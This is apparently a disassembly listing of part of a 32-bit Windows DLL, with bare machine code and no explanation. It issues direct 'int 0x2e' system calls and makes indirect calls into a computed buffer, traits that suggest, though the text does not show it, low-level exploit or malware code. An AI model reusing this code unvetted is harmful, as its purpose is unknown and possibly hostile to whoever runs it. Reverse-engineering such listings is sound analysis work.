1000a1b2:	56                   	push   %esi
1000a1b3:	e8 af 1c 00 00       	call   0x1000be67
1000a1b8:	83 c4 18             	add    $0x18,%esp
1000a1bb:	8b d8                	mov    %eax,%ebx
1000a1bd:	56                   	push   %esi
1000a1be:	ff 15 30 e1 00 10    	call   *0x1000e130
1000a1c4:	3b df                	cmp    %edi,%ebx
1000a1c6:	74 07                	je     0x1000a1cf
1000a1c8:	6a d4                	push   $0xffffffd4
1000a1ca:	e9 85 00 00 00       	jmp    0x1000a254
1000a1cf:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000a1d2:	50                   	push   %eax
1000a1d3:	e8 fb f9 ff ff       	call   0x10009bd3
1000a1d8:	c7 04 24 30 04 01 10 	movl   $0x10010430,(%esp)
1000a1df:	ff 75 08             	push   0x8(%ebp)
1000a1e2:	ff 15 d8 e0 00 10    	call   *0x1000e0d8
1000a1e8:	ff 75 08             	push   0x8(%ebp)
1000a1eb:	68 28 04 01 10       	push   $0x10010428
1000a1f0:	ff 75 0c             	push   0xc(%ebp)
1000a1f3:	ff 15 00 e2 00 10    	call   *0x1000e200
1000a1f9:	8d 45 10             	lea    0x10(%ebp),%eax
1000a1fc:	6a 07                	push   $0x7
1000a1fe:	89 45 14             	mov    %eax,0x14(%ebp)
1000a201:	8d 45 bc             	lea    -0x44(%ebp),%eax
1000a204:	50                   	push   %eax
1000a205:	6a 01                	push   $0x1
1000a207:	68 5a a2 00 10       	push   $0x1000a25a
1000a20c:	89 7d 10             	mov    %edi,0x10(%ebp)
1000a20f:	ff 75 08             	push   0x8(%ebp)
1000a212:	6a 11                	push   $0x11
1000a214:	68 14 04 01 10       	push   $0x10010414
1000a219:	e8 17 f6 ff ff       	call   0x10009835
1000a21e:	83 c4 1c             	add    $0x1c,%esp
1000a221:	8b 45 bc             	mov    -0x44(%ebp),%eax
1000a224:	6a 00                	push   $0x0
1000a226:	ff 75 14             	push   0x14(%ebp)
1000a229:	ff 75 c4             	push   -0x3c(%ebp)
1000a22c:	6a 00                	push   $0x0
1000a22e:	ff 75 0c             	push   0xc(%ebp)
1000a231:	8b d4                	mov    %esp,%edx
1000a233:	cd 2e                	int    $0x2e
1000a235:	83 c4 14             	add    $0x14,%esp
1000a238:	83 4d 08 ff          	orl    $0xffffffff,0x8(%ebp)
1000a23c:	8b 45 c0             	mov    -0x40(%ebp),%eax
1000a23f:	6a 00                	push   $0x0
1000a241:	6a 00                	push   $0x0
1000a243:	8b d4                	mov    %esp,%edx
1000a245:	cd 2e                	int    $0x2e
1000a247:	83 c4 08             	add    $0x8,%esp
1000a24a:	89 45 08             	mov    %eax,0x8(%ebp)
1000a24d:	8b 45 08             	mov    0x8(%ebp),%eax
1000a250:	eb 03                	jmp    0x1000a255
1000a252:	6a 57                	push   $0x57
1000a254:	58                   	pop    %eax
1000a255:	5f                   	pop    %edi
1000a256:	5e                   	pop    %esi
1000a257:	5b                   	pop    %ebx
1000a258:	c9                   	leave
1000a259:	c3                   	ret
1000a25a:	55                   	push   %ebp
1000a25b:	8b ec                	mov    %esp,%ebp
1000a25d:	6a ff                	push   $0xffffffff
1000a25f:	68 a8 e5 00 10       	push   $0x1000e5a8
1000a264:	68 00 c6 00 10       	push   $0x1000c600
1000a269:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000a26f:	50                   	push   %eax
1000a270:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000a277:	83 ec 10             	sub    $0x10,%esp
1000a27a:	53                   	push   %ebx
1000a27b:	56                   	push   %esi
1000a27c:	57                   	push   %edi
1000a27d:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000a280:	8b 45 08             	mov    0x8(%ebp),%eax
1000a283:	8b 48 08             	mov    0x8(%eax),%ecx
1000a286:	8b 50 0c             	mov    0xc(%eax),%edx
1000a289:	89 11                	mov    %edx,(%ecx)
1000a28b:	8b 48 08             	mov    0x8(%eax),%ecx
1000a28e:	83 c1 04             	add    $0x4,%ecx
1000a291:	8b 50 10             	mov    0x10(%eax),%edx
1000a294:	89 11                	mov    %edx,(%ecx)
1000a296:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000a29a:	ff 70 1c             	push   0x1c(%eax)
1000a29d:	ff 70 18             	push   0x18(%eax)
1000a2a0:	8d 48 20             	lea    0x20(%eax),%ecx
1000a2a3:	51                   	push   %ecx
1000a2a4:	ff 50 14             	call   *0x14(%eax)
1000a2a7:	83 c4 0c             	add    $0xc,%esp
1000a2aa:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000a2ae:	eb 0e                	jmp    0x1000a2be
1000a2b0:	6a 01                	push   $0x1
1000a2b2:	58                   	pop    %eax
1000a2b3:	c3                   	ret
1000a2b4:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000a2b7:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000a2bb:	6a d5                	push   $0xffffffd5
1000a2bd:	58                   	pop    %eax
1000a2be:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000a2c1:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000a2c8:	5f                   	pop    %edi
1000a2c9:	5e                   	pop    %esi
1000a2ca:	5b                   	pop    %ebx
1000a2cb:	c9                   	leave
1000a2cc:	c3                   	ret
1000a2cd:	55                   	push   %ebp
1000a2ce:	8b ec                	mov    %esp,%ebp
1000a2d0:	6a ff                	push   $0xffffffff
1000a2d2:	68 b8 e5 00 10       	push   $0x1000e5b8
1000a2d7:	68 00 c6 00 10       	push   $0x1000c600
1000a2dc:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000a2e2:	50                   	push   %eax
1000a2e3:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000a2ea:	81 ec 88 03 00 00    	sub    $0x388,%esp
1000a2f0:	53                   	push   %ebx
1000a2f1:	56                   	push   %esi
1000a2f2:	57                   	push   %edi
1000a2f3:	8b 7d 08             	mov    0x8(%ebp),%edi
1000a2f6:	33 db                	xor    %ebx,%ebx
1000a2f8:	3b fb                	cmp    %ebx,%edi
1000a2fa:	0f 84 cc 04 00 00    	je     0x1000a7cc
1000a300:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
1000a303:	0f 84 c3 04 00 00    	je     0x1000a7cc
1000a309:	8b 45 10             	mov    0x10(%ebp),%eax
1000a30c:	3b c3                	cmp    %ebx,%eax
1000a30e:	0f 84 b8 04 00 00    	je     0x1000a7cc
1000a314:	89 45 94             	mov    %eax,-0x6c(%ebp)
1000a317:	8b 45 14             	mov    0x14(%ebp),%eax
1000a31a:	89 45 d8             	mov    %eax,-0x28(%ebp)
1000a31d:	8b 45 18             	mov    0x18(%ebp),%eax
1000a320:	89 45 dc             	mov    %eax,-0x24(%ebp)
1000a323:	8d 87 00 02 00 00    	lea    0x200(%edi),%eax
1000a329:	89 85 68 fc ff ff    	mov    %eax,-0x398(%ebp)
1000a32f:	89 45 d4             	mov    %eax,-0x2c(%ebp)
1000a332:	88 5d e0             	mov    %bl,-0x20(%ebp)
1000a335:	88 5d e1             	mov    %bl,-0x1f(%ebp)
1000a338:	68 14 05 01 10       	push   $0x10010514
1000a33d:	e8 13 24 00 00       	call   0x1000c755
1000a342:	59                   	pop    %ecx
1000a343:	89 45 e4             	mov    %eax,-0x1c(%ebp)
1000a346:	3b c3                	cmp    %ebx,%eax
1000a348:	75 07                	jne    0x1000a351
1000a34a:	6a ba                	push   $0xffffffba
1000a34c:	e9 7d 04 00 00       	jmp    0x1000a7ce
1000a351:	8d 45 8c             	lea    -0x74(%ebp),%eax
1000a354:	50                   	push   %eax
1000a355:	8d 45 88             	lea    -0x78(%ebp),%eax
1000a358:	50                   	push   %eax
1000a359:	e8 59 1b 00 00       	call   0x1000beb7
1000a35e:	59                   	pop    %ecx
1000a35f:	59                   	pop    %ecx
1000a360:	3b c3                	cmp    %ebx,%eax
1000a362:	74 07                	je     0x1000a36b
1000a364:	6a d4                	push   $0xffffffd4
1000a366:	e9 63 04 00 00       	jmp    0x1000a7ce
1000a36b:	8d 45 b0             	lea    -0x50(%ebp),%eax
1000a36e:	50                   	push   %eax
1000a36f:	e8 5f f8 ff ff       	call   0x10009bd3
1000a374:	59                   	pop    %ecx
1000a375:	84 c0                	test   %al,%al
1000a377:	75 07                	jne    0x1000a380
1000a379:	6a c3                	push   $0xffffffc3
1000a37b:	e9 4e 04 00 00       	jmp    0x1000a7ce
1000a380:	83 4d 84 ff          	orl    $0xffffffff,-0x7c(%ebp)
1000a384:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000a387:	89 9d c4 fe ff ff    	mov    %ebx,-0x13c(%ebp)
1000a38d:	8d 85 c4 fe ff ff    	lea    -0x13c(%ebp),%eax
1000a393:	50                   	push   %eax
1000a394:	8d 45 94             	lea    -0x6c(%ebp),%eax
1000a397:	50                   	push   %eax
1000a398:	e8 cc 06 00 00       	call   0x1000aa69
1000a39d:	59                   	pop    %ecx
1000a39e:	59                   	pop    %ecx
1000a39f:	84 c0                	test   %al,%al
1000a3a1:	75 0c                	jne    0x1000a3af
1000a3a3:	c7 45 84 c1 ff ff ff 	movl   $0xffffffc1,-0x7c(%ebp)
1000a3aa:	e9 fb 03 00 00       	jmp    0x1000a7aa
1000a3af:	6a 0d                	push   $0xd
1000a3b1:	8d 45 94             	lea    -0x6c(%ebp),%eax
1000a3b4:	50                   	push   %eax
1000a3b5:	6a 07                	push   $0x7
1000a3b7:	68 de a7 00 10       	push   $0x1000a7de
1000a3bc:	57                   	push   %edi
1000a3bd:	6a 17                	push   $0x17
1000a3bf:	68 74 04 01 10       	push   $0x10010474
1000a3c4:	e8 6c f4 ff ff       	call   0x10009835
1000a3c9:	89 bd 88 fe ff ff    	mov    %edi,-0x178(%ebp)
1000a3cf:	8b c7                	mov    %edi,%eax
1000a3d1:	c1 e8 10             	shr    $0x10,%eax
1000a3d4:	89 85 7c fc ff ff    	mov    %eax,-0x384(%ebp)
1000a3da:	c7 85 74 ff ff ff a0 	movl   $0xa0,-0x8c(%ebp)
1000a3e1:	00 00 00 
1000a3e4:	c7 85 94 fe ff ff 30 	movl   $0x30,-0x16c(%ebp)
1000a3eb:	00 00 00 
1000a3ee:	89 9d 98 fe ff ff    	mov    %ebx,-0x168(%ebp)
1000a3f4:	89 9d 9c fe ff ff    	mov    %ebx,-0x164(%ebp)
1000a3fa:	89 9d a0 fe ff ff    	mov    %ebx,-0x160(%ebp)
1000a400:	89 9d a4 fe ff ff    	mov    %ebx,-0x15c(%ebp)
1000a406:	89 9d a8 fe ff ff    	mov    %ebx,-0x158(%ebp)
1000a40c:	89 9d ac fe ff ff    	mov    %ebx,-0x154(%ebp)
1000a412:	89 9d b0 fe ff ff    	mov    %ebx,-0x150(%ebp)
1000a418:	89 9d b4 fe ff ff    	mov    %ebx,-0x14c(%ebp)
1000a41e:	89 9d b8 fe ff ff    	mov    %ebx,-0x148(%ebp)
1000a424:	89 9d bc fe ff ff    	mov    %ebx,-0x144(%ebp)
1000a42a:	89 9d c0 fe ff ff    	mov    %ebx,-0x140(%ebp)
1000a430:	8d 85 94 fe ff ff    	lea    -0x16c(%ebp),%eax
1000a436:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
1000a43c:	8d 87 60 ff ff ff    	lea    -0xa0(%edi),%eax
1000a442:	25 ff ff 00 00       	and    $0xffff,%eax
1000a447:	89 85 a4 fe ff ff    	mov    %eax,-0x15c(%ebp)
1000a44d:	68 f4 04 01 10       	push   $0x100104f4
1000a452:	8d 85 80 fc ff ff    	lea    -0x380(%ebp),%eax
1000a458:	50                   	push   %eax
1000a459:	ff 15 8c e1 00 10    	call   *0x1000e18c
1000a45f:	8d 85 80 fc ff ff    	lea    -0x380(%ebp),%eax
1000a465:	50                   	push   %eax
1000a466:	ff 15 e8 e1 00 10    	call   *0x1000e1e8
1000a46c:	83 c4 28             	add    $0x28,%esp
1000a46f:	d1 e0                	shl    $1,%eax
1000a471:	66 89 85 80 fe ff ff 	mov    %ax,-0x180(%ebp)
1000a478:	66 c7 85 82 fe ff ff 	movw   $0x200,-0x17e(%ebp)
1000a47f:	00 02 
1000a481:	8d 85 80 fc ff ff    	lea    -0x380(%ebp),%eax
1000a487:	89 85 84 fe ff ff    	mov    %eax,-0x17c(%ebp)
1000a48d:	8d 85 80 fe ff ff    	lea    -0x180(%ebp),%eax
1000a493:	89 85 8c fe ff ff    	mov    %eax,-0x174(%ebp)
1000a499:	89 9d 70 ff ff ff    	mov    %ebx,-0x90(%ebp)
1000a49f:	89 9d 70 fc ff ff    	mov    %ebx,-0x390(%ebp)
1000a4a5:	6a 08                	push   $0x8
1000a4a7:	53                   	push   %ebx
1000a4a8:	8b 35 c4 e0 00 10    	mov    0x1000e0c4,%esi
1000a4ae:	ff d6                	call   *%esi
1000a4b0:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
1000a4b6:	6a 10                	push   $0x10
1000a4b8:	53                   	push   %ebx
1000a4b9:	ff d6                	call   *%esi
1000a4bb:	8b f0                	mov    %eax,%esi
1000a4bd:	89 b5 70 fc ff ff    	mov    %esi,-0x390(%ebp)
1000a4c3:	6a 08                	push   $0x8
1000a4c5:	53                   	push   %ebx
1000a4c6:	ff b5 70 ff ff ff    	push   -0x90(%ebp)
1000a4cc:	e8 45 2e 00 00       	call   0x1000d316
1000a4d1:	6a 10                	push   $0x10
1000a4d3:	53                   	push   %ebx
1000a4d4:	56                   	push   %esi
1000a4d5:	e8 3c 2e 00 00       	call   0x1000d316
1000a4da:	6a 08                	push   $0x8
1000a4dc:	53                   	push   %ebx
1000a4dd:	8d 85 74 fc ff ff    	lea    -0x38c(%ebp),%eax
1000a4e3:	50                   	push   %eax
1000a4e4:	e8 2d 2e 00 00       	call   0x1000d316
1000a4e9:	8b 85 70 ff ff ff    	mov    -0x90(%ebp),%eax
1000a4ef:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
1000a4f5:	89 b5 7c ff ff ff    	mov    %esi,-0x84(%ebp)
1000a4fb:	8d 85 74 fc ff ff    	lea    -0x38c(%ebp),%eax
1000a501:	89 45 80             	mov    %eax,-0x80(%ebp)
1000a504:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
1000a50a:	89 85 c8 fe ff ff    	mov    %eax,-0x138(%ebp)
1000a510:	be 9c 00 00 00       	mov    $0x9c,%esi
1000a515:	56                   	push   %esi
1000a516:	53                   	push   %ebx
1000a517:	8d 85 cc fe ff ff    	lea    -0x134(%ebp),%eax
1000a51d:	50                   	push   %eax
1000a51e:	e8 f3 2d 00 00       	call   0x1000d316
1000a523:	83 c4 30             	add    $0x30,%esp
1000a526:	89 b5 cc fe ff ff    	mov    %esi,-0x134(%ebp)
1000a52c:	8d 85 cc fe ff ff    	lea    -0x134(%ebp),%eax
1000a532:	50                   	push   %eax
1000a533:	ff 15 b8 e0 00 10    	call   *0x1000e0b8
1000a539:	c7 85 6c fc ff ff a0 	movl   $0x100104a0,-0x394(%ebp)
1000a540:	04 01 10 
1000a543:	6a 0a                	push   $0xa
1000a545:	58                   	pop    %eax
1000a546:	89 85 68 ff ff ff    	mov    %eax,-0x98(%ebp)
1000a54c:	66 83 bd 60 ff ff ff 	cmpw   $0x1,-0xa0(%ebp)
1000a553:	01 
1000a554:	72 10                	jb     0x1000a566
1000a556:	c7 85 6c fc ff ff ac 	movl   $0x100104ac,-0x394(%ebp)
1000a55d:	04 01 10 
1000a560:	89 85 68 ff ff ff    	mov    %eax,-0x98(%ebp)
1000a566:	8d 8f 00 05 00 00    	lea    0x500(%edi),%ecx
1000a56c:	89 8d 90 fe ff ff    	mov    %ecx,-0x170(%ebp)
1000a572:	6a 08                	push   $0x8
1000a574:	6a 1c                	push   $0x1c
1000a576:	51                   	push   %ecx
1000a577:	50                   	push   %eax
1000a578:	ff b5 6c fc ff ff    	push   -0x394(%ebp)
1000a57e:	e8 15 f3 ff ff       	call   0x10009898
1000a583:	83 c4 14             	add    $0x14,%esp
1000a586:	50                   	push   %eax
1000a587:	53                   	push   %ebx
1000a588:	51                   	push   %ecx
1000a589:	52                   	push   %edx
1000a58a:	56                   	push   %esi
1000a58b:	57                   	push   %edi
1000a58c:	6a 00                	push   $0x0
1000a58e:	68 80 00 00 00       	push   $0x80
1000a593:	68 5a 02 00 00       	push   $0x25a
1000a598:	ff b5 c8 fe ff ff    	push   -0x138(%ebp)
1000a59e:	ff b5 8c fe ff ff    	push   -0x174(%ebp)
1000a5a4:	ff b5 8c fe ff ff    	push   -0x174(%ebp)
1000a5aa:	ff b5 6c ff ff ff    	push   -0x94(%ebp)
1000a5b0:	8b 45 88             	mov    -0x78(%ebp),%eax
1000a5b3:	ff 95 90 fe ff ff    	call   *-0x170(%ebp)
1000a5b9:	5f                   	pop    %edi
1000a5ba:	5e                   	pop    %esi
1000a5bb:	5a                   	pop    %edx
1000a5bc:	59                   	pop    %ecx
1000a5bd:	5b                   	pop    %ebx
1000a5be:	58                   	pop    %eax
1000a5bf:	33 db                	xor    %ebx,%ebx
1000a5c1:	53                   	push   %ebx
1000a5c2:	68 e4 04 01 10       	push   $0x100104e4
1000a5c7:	ff 15 fc e1 00 10    	call   *0x1000e1fc
1000a5cd:	8b 85 7c fc ff ff    	mov    -0x384(%ebp),%eax
1000a5d3:	05 60 ff ff ff       	add    $0xffffff60,%eax
1000a5d8:	25 ff ff 00 00       	and    $0xffff,%eax
1000a5dd:	89 85 a4 fe ff ff    	mov    %eax,-0x15c(%ebp)
1000a5e3:	6a 08                	push   $0x8
1000a5e5:	53                   	push   %ebx
1000a5e6:	8b 35 c4 e0 00 10    	mov    0x1000e0c4,%esi
1000a5ec:	ff d6                	call   *%esi
1000a5ee:	8b f8                	mov    %eax,%edi
1000a5f0:	89 bd 70 ff ff ff    	mov    %edi,-0x90(%ebp)
1000a5f6:	6a 10                	push   $0x10
1000a5f8:	53                   	push   %ebx
1000a5f9:	ff d6                	call   *%esi
1000a5fb:	8b f0                	mov    %eax,%esi
1000a5fd:	89 b5 70 fc ff ff    	mov    %esi,-0x390(%ebp)
1000a603:	6a 08                	push   $0x8
1000a605:	53                   	push   %ebx
1000a606:	57                   	push   %edi
1000a607:	e8 0a 2d 00 00       	call   0x1000d316
1000a60c:	6a 10                	push   $0x10
1000a60e:	53                   	push   %ebx
1000a60f:	56                   	push   %esi
1000a610:	e8 01 2d 00 00       	call   0x1000d316
1000a615:	89 bd 78 ff ff ff    	mov    %edi,-0x88(%ebp)
1000a61b:	89 b5 7c ff ff ff    	mov    %esi,-0x84(%ebp)
1000a621:	68 c8 04 01 10       	push   $0x100104c8
1000a626:	8d 85 80 fc ff ff    	lea    -0x380(%ebp),%eax
1000a62c:	50                   	push   %eax
1000a62d:	ff 15 8c e1 00 10    	call   *0x1000e18c
1000a633:	8d 85 80 fc ff ff    	lea    -0x380(%ebp),%eax
1000a639:	50                   	push   %eax
1000a63a:	ff 15 e8 e1 00 10    	call   *0x1000e1e8
1000a640:	d1 e0                	shl    $1,%eax
1000a642:	66 89 85 80 fe ff ff 	mov    %ax,-0x180(%ebp)
1000a649:	66 c7 85 82 fe ff ff 	movw   $0x200,-0x17e(%ebp)
1000a650:	00 02 
1000a652:	6a 08                	push   $0x8
1000a654:	6a 1c                	push   $0x1c
1000a656:	ff b5 90 fe ff ff    	push   -0x170(%ebp)
1000a65c:	6a 0a                	push   $0xa
1000a65e:	ff b5 6c fc ff ff    	push   -0x394(%ebp)
1000a664:	e8 2f f2 ff ff       	call   0x10009898
1000a669:	83 c4 38             	add    $0x38,%esp
1000a66c:	50                   	push   %eax
1000a66d:	53                   	push   %ebx
1000a66e:	51                   	push   %ecx
1000a66f:	52                   	push   %edx
1000a670:	56                   	push   %esi
1000a671:	57                   	push   %edi
1000a672:	6a 00                	push   $0x0
1000a674:	68 80 00 00 00       	push   $0x80
1000a679:	68 5b 02 00 00       	push   $0x25b
1000a67e:	ff b5 c8 fe ff ff    	push   -0x138(%ebp)
1000a684:	ff b5 8c fe ff ff    	push   -0x174(%ebp)
1000a68a:	ff b5 8c fe ff ff    	push   -0x174(%ebp)
1000a690:	ff b5 6c ff ff ff    	push   -0x94(%ebp)
1000a696:	8b 45 88             	mov    -0x78(%ebp),%eax
1000a699:	ff 95 90 fe ff ff    	call   *-0x170(%ebp)
1000a69f:	5f                   	pop    %edi
1000a6a0:	5e                   	pop    %esi
1000a6a1:	5a                   	pop    %edx
1000a6a2:	59                   	pop    %ecx
1000a6a3:	5b                   	pop    %ebx
1000a6a4:	58                   	pop    %eax
1000a6a5:	6a 00                	push   $0x0
1000a6a7:	68 b8 04 01 10       	push   $0x100104b8
1000a6ac:	ff 15 fc e1 00 10    	call   *0x1000e1fc
1000a6b2:	6a 08                	push   $0x8
1000a6b4:	6a 1c                	push   $0x1c
1000a6b6:	ff b5 90 fe ff ff    	push   -0x170(%ebp)
1000a6bc:	6a 0a                	push   $0xa
1000a6be:	ff b5 6c fc ff ff    	push   -0x394(%ebp)
1000a6c4:	e8 cf f1 ff ff       	call   0x10009898
1000a6c9:	ff b5 c4 fe ff ff    	push   -0x13c(%ebp)
1000a6cf:	e8 6c 1f 00 00       	call   0x1000c640
1000a6d4:	83 c4 18             	add    $0x18,%esp
1000a6d7:	84 c0                	test   %al,%al
1000a6d9:	75 0c                	jne    0x1000a6e7
1000a6db:	c7 45 84 c3 ff ff ff 	movl   $0xffffffc3,-0x7c(%ebp)
1000a6e2:	e9 c1 00 00 00       	jmp    0x1000a7a8
1000a6e7:	50                   	push   %eax
1000a6e8:	53                   	push   %ebx
1000a6e9:	51                   	push   %ecx
1000a6ea:	52                   	push   %edx
1000a6eb:	56                   	push   %esi
1000a6ec:	57                   	push   %edi
1000a6ed:	6a 00                	push   $0x0
1000a6ef:	6a 01                	push   $0x1
1000a6f1:	6a 00                	push   $0x0
1000a6f3:	6a 00                	push   $0x0
1000a6f5:	6a 00                	push   $0x0
1000a6f7:	68 00 06 00 00       	push   $0x600
1000a6fc:	ff 75 0c             	push   0xc(%ebp)
1000a6ff:	8b 45 8c             	mov    -0x74(%ebp),%eax
1000a702:	ff 95 90 fe ff ff    	call   *-0x170(%ebp)
1000a708:	89 45 84             	mov    %eax,-0x7c(%ebp)
1000a70b:	5f                   	pop    %edi
1000a70c:	5e                   	pop    %esi
1000a70d:	5a                   	pop    %edx
1000a70e:	59                   	pop    %ecx
1000a70f:	5b                   	pop    %ebx
1000a710:	58                   	pop    %eax
1000a711:	6a 00                	push   $0x0
1000a713:	e8 28 1f 00 00       	call   0x1000c640
1000a718:	59                   	pop    %ecx
1000a719:	83 7d 84 00          	cmpl   $0x0,-0x7c(%ebp)
1000a71d:	0f 85 85 00 00 00    	jne    0x1000a7a8
1000a723:	80 7d e0 00          	cmpb   $0x0,-0x20(%ebp)
1000a727:	74 78                	je     0x1000a7a1
1000a729:	6a 07                	push   $0x7
1000a72b:	8d 45 94             	lea    -0x6c(%ebp),%eax
1000a72e:	50                   	push   %eax
1000a72f:	6a 01                	push   $0x1
1000a731:	68 d2 a8 00 10       	push   $0x1000a8d2
1000a736:	ff b5 68 fc ff ff    	push   -0x398(%ebp)
1000a73c:	6a 11                	push   $0x11
1000a73e:	68 8c 04 01 10       	push   $0x1001048c
1000a743:	e8 ed f0 ff ff       	call   0x10009835
1000a748:	6a 08                	push   $0x8
1000a74a:	6a 04                	push   $0x4
1000a74c:	ff b5 90 fe ff ff    	push   -0x170(%ebp)
1000a752:	6a 0a                	push   $0xa
1000a754:	ff b5 6c fc ff ff    	push   -0x394(%ebp)
1000a75a:	e8 39 f1 ff ff       	call   0x10009898
1000a75f:	ff b5 c4 fe ff ff    	push   -0x13c(%ebp)
1000a765:	e8 d6 1e 00 00       	call   0x1000c640
1000a76a:	83 c4 34             	add    $0x34,%esp
1000a76d:	84 c0                	test   %al,%al
1000a76f:	0f 84 66 ff ff ff    	je     0x1000a6db
1000a775:	83 4d 84 ff          	orl    $0xffffffff,-0x7c(%ebp)
1000a779:	50                   	push   %eax
1000a77a:	53                   	push   %ebx
1000a77b:	51                   	push   %ecx
1000a77c:	52                   	push   %edx
1000a77d:	56                   	push   %esi
1000a77e:	57                   	push   %edi
1000a77f:	6a 64                	push   $0x64
1000a781:	8b 45 e4             	mov    -0x1c(%ebp),%eax
1000a784:	ff 95 90 fe ff ff    	call   *-0x170(%ebp)
1000a78a:	89 45 84             	mov    %eax,-0x7c(%ebp)
1000a78d:	5f                   	pop    %edi
1000a78e:	5e                   	pop    %esi
1000a78f:	5a                   	pop    %edx
1000a790:	59                   	pop    %ecx
1000a791:	5b                   	pop    %ebx
1000a792:	58                   	pop    %eax
1000a793:	6a 00                	push   $0x0
1000a795:	e8 a6 1e 00 00       	call   0x1000c640
1000a79a:	59                   	pop    %ecx
1000a79b:	80 7d e1 00          	cmpb   $0x0,-0x1f(%ebp)
1000a79f:	75 07                	jne    0x1000a7a8
1000a7a1:	c7 45 84 c0 ff ff ff 	movl   $0xffffffc0,-0x7c(%ebp)
1000a7a8:	33 db                	xor    %ebx,%ebx
1000a7aa:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000a7ae:	e8 07 00 00 00       	call   0x1000a7ba
1000a7b3:	8b 45 84             	mov    -0x7c(%ebp),%eax
1000a7b6:	eb 17                	jmp    0x1000a7cf
1000a7b8:	33 db                	xor    %ebx,%ebx
1000a7ba:	39 5d b0             	cmp    %ebx,-0x50(%ebp)
1000a7bd:	74 0c                	je     0x1000a7cb
1000a7bf:	ff 75 b0             	push   -0x50(%ebp)
1000a7c2:	ff 15 98 e0 00 10    	call   *0x1000e098
1000a7c8:	89 5d b0             	mov    %ebx,-0x50(%ebp)
1000a7cb:	c3                   	ret
1000a7cc:	6a 57                	push   $0x57
1000a7ce:	58                   	pop    %eax
1000a7cf:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000a7d2:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000a7d9:	5f                   	pop    %edi
1000a7da:	5e                   	pop    %esi
1000a7db:	5b                   	pop    %ebx
1000a7dc:	c9                   	leave
1000a7dd:	c3                   	ret
1000a7de:	55                   	push   %ebp
1000a7df:	8b ec                	mov    %esp,%ebp
1000a7e1:	6a ff                	push   $0xffffffff
1000a7e3:	68 c8 e5 00 10       	push   $0x1000e5c8
1000a7e8:	68 00 c6 00 10       	push   $0x1000c600
1000a7ed:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000a7f3:	50                   	push   %eax
1000a7f4:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000a7fb:	83 ec 24             	sub    $0x24,%esp
1000a7fe:	53                   	push   %ebx
1000a7ff:	56                   	push   %esi
1000a800:	57                   	push   %edi
1000a801:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000a804:	33 db                	xor    %ebx,%ebx
1000a806:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000a809:	8b 75 08             	mov    0x8(%ebp),%esi
1000a80c:	8b 46 04             	mov    0x4(%esi),%eax
1000a80f:	8b 38                	mov    (%eax),%edi
1000a811:	89 7d d8             	mov    %edi,-0x28(%ebp)
1000a814:	8b 46 50             	mov    0x50(%esi),%eax
1000a817:	8d 04 87             	lea    (%edi,%eax,4),%eax
1000a81a:	89 46 08             	mov    %eax,0x8(%esi)
1000a81d:	8b 08                	mov    (%eax),%ecx
1000a81f:	89 4e 0c             	mov    %ecx,0xc(%esi)
1000a822:	8d 4e 40             	lea    0x40(%esi),%ecx
1000a825:	8d 56 1c             	lea    0x1c(%esi),%edx
1000a828:	53                   	push   %ebx
1000a829:	6a 04                	push   $0x4
1000a82b:	51                   	push   %ecx
1000a82c:	50                   	push   %eax
1000a82d:	52                   	push   %edx
1000a82e:	e8 5f 1c 00 00       	call   0x1000c492
1000a833:	83 c4 14             	add    $0x14,%esp
1000a836:	89 45 d4             	mov    %eax,-0x2c(%ebp)
1000a839:	3b c3                	cmp    %ebx,%eax
1000a83b:	75 72                	jne    0x1000a8af
1000a83d:	8b 4e 10             	mov    0x10(%esi),%ecx
1000a840:	89 4d e0             	mov    %ecx,-0x20(%ebp)
1000a843:	8b 46 04             	mov    0x4(%esi),%eax
1000a846:	89 45 dc             	mov    %eax,-0x24(%ebp)
1000a849:	3b cb                	cmp    %ebx,%ecx
1000a84b:	74 5c                	je     0x1000a8a9
1000a84d:	33 c1                	xor    %ecx,%eax
1000a84f:	a9 00 f0 ff ff       	test   $0xfffff000,%eax
1000a854:	75 53                	jne    0x1000a8a9
1000a856:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
1000a85d:	8b 01                	mov    (%ecx),%eax
1000a85f:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000a862:	3b c7                	cmp    %edi,%eax
1000a864:	74 37                	je     0x1000a89d
1000a866:	8b 4e 50             	mov    0x50(%esi),%ecx
1000a869:	8d 04 88             	lea    (%eax,%ecx,4),%eax
1000a86c:	89 46 14             	mov    %eax,0x14(%esi)
1000a86f:	8b 08                	mov    (%eax),%ecx
1000a871:	89 4e 18             	mov    %ecx,0x18(%esi)
1000a874:	53                   	push   %ebx
1000a875:	6a 04                	push   $0x4
1000a877:	8d 4e 40             	lea    0x40(%esi),%ecx
1000a87a:	51                   	push   %ecx
1000a87b:	50                   	push   %eax
1000a87c:	8d 46 1c             	lea    0x1c(%esi),%eax
1000a87f:	50                   	push   %eax
1000a880:	e8 0d 1c 00 00       	call   0x1000c492
1000a885:	83 c4 14             	add    $0x14,%esp
1000a888:	89 45 cc             	mov    %eax,-0x34(%ebp)
1000a88b:	3b c3                	cmp    %ebx,%eax
1000a88d:	74 17                	je     0x1000a8a6
1000a88f:	eb 0c                	jmp    0x1000a89d
